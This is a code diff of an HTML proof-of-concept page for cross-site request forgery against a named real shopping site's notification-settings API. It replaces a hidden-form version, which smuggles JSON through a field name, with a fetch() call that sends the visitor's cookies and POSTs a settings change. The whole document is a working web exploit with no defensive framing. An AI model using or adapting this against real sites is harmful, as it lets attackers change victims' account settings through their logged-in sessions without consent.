@@ -1,10 +1,25 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>Manual CSRF PoC - POST to Temu Notification Configure</h3>
-    <form action="https://www.temu.com/api/bg-barbera-api/setting/notification/configure" method="POST" target="_blank">
-      <input type="hidden" name='{"id"' value='100,"status":1}'>
-      <input type="submit" value="Submit CSRF Request">
-    </form>
+    <h3>Manual CSRF PoC with JSON Payload</h3>
+    <button onclick="sendCSRF()">Send CSRF POST</button>
+
+    <script>
+      function sendCSRF() {
+        fetch("https://www.temu.com/api/bg-barbera-api/setting/notification/configure", {
+          method: "POST",
+          credentials: "include", // sends cookies
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            id: 100,
+            status: 1
+          })
+        })
+        .then(response => alert('Request sent. Status: ' + response.status))
+        .catch(error => alert('Error: ' + error));
+      }
+    </script>
   </body>
 </html>
